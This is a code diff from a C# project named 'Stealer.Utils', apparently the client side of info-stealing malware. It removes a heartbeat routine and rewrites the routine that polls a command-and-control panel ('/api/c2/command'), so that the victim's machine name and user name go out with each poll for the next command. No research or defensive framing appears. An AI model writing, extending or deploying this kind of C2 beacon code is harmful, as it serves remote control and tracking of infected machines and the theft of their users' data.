@@ -22,27 +22,17 @@ namespace Stealer.Utils
             }
         }
 
-        public static void SendHeartbeat(string clientId)
-        {
-            var wc = new WebClient();
-            wc.Headers[HttpRequestHeader.ContentType] = "application/json";
-            if (!string.IsNullOrEmpty(Config.SecretKey))
-                wc.Headers["x-panel-key"] = Config.SecretKey;
-
-            string json = "{\"client_id\":\"" + Escape(clientId) +
-                          "\",\"hostname\":\"" + Escape(Environment.MachineName) +
-                          "\",\"username\":\"" + Escape(Environment.UserName) + "\"}";
-
-            wc.UploadString(BaseUrl + "/api/c2/heartbeat", json);
-        }
-
         public static string PollCommand(string clientId)
         {
             var wc = new WebClient();
             if (!string.IsNullOrEmpty(Config.SecretKey))
                 wc.Headers["x-panel-key"] = Config.SecretKey;
 
-            string body = wc.DownloadString(BaseUrl + "/api/c2/command?client_id=" + Uri.EscapeDataString(clientId));
+            string url = BaseUrl + "/api/c2/command?client_id=" + Uri.EscapeDataString(clientId)
+                + "&hostname=" + Uri.EscapeDataString(Environment.MachineName)
+                + "&username=" + Uri.EscapeDataString(Environment.UserName);
+
+            string body = wc.DownloadString(url);
             return ParseJsonKey(body, "command");
         }
 
